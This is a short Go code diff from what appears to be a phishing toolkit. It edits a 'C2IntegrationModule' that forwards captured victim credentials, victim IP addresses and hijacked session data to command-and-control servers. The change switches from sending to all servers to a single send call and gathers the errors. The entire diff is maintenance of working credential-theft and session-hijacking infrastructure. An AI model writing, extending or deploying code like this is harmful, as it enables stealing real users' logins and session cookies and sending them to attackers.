@@ -58,7 +58,10 @@ func (m *C2IntegrationModule) handleCredentialCaptured(ctx context.Context, even
 		"victim_ip": ev.VictimIP,
 		"timestamp": time.Now().Format(time.RFC3339),
 	}
-	errs := m.manager.SendCredentialsToAll(ctx, creds, metadata)
+	errs := make([]error, 0)
+	if err := m.manager.SendCredentials(ctx, creds, metadata); err != nil {
+		errs = append(errs, err)
+	}
 	for _, e := range errs {
 		m.logger.Warn("C2 send credentials error", zap.Error(e))
 	}
@@ -84,7 +87,10 @@ func (m *C2IntegrationModule) handleSessionCaptured(ctx context.Context, eventTy
 		PhishletID:  session.PhishletID,
 		UserAgent:   session.UserAgent,
 	}
-	errs := m.manager.SendSessionToAll(ctx, data)
+	errs := make([]error, 0)
+	if err := m.manager.SendSession(ctx, data); err != nil {
+		errs = append(errs, err)
+	}
 	for _, e := range errs {
 		m.logger.Warn("C2 send session error", zap.Error(e))
 	}
